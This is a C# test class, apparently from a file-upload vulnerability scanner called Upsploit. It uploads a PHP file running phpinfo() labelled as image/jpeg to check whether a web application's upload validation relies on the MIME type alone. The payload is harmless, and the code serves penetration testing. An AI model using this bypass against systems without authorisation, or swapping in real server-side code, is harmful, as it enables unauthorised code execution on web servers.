using System.Text;
using System.Threading.Tasks;

/*
* Test #2
* Description: This test looks for MIME-Type validation by uploading a php file with the content type changed.
***The changed content-type only effects the upload, the browser/server will still see it as a php file.
*/
namespace Upsploit.Tests {
    class Test02 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test02() {
            description = "This test uploads a file (Test_2.php) with the MIME type \"image/jpeg\", " +
                          "by using a MIME type that doesn't match the file, it will evade MIME type validation." +
                          "\r\n\r\n" +
                          "This test will work if there is only MIME type validation.";

            validation = "Look for Test_2.php on the web application. If the file loads the phpinfo, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the webpage is no longer a php file or it doesn't render in the browser, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            const string data = "<?php\n"
                              + "  echo phpinfo();\n"
                              + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");
            request.setFileName("Test_2.php");

            await request.send();
            printResult(request, "Test 02");
        }

        
    }
}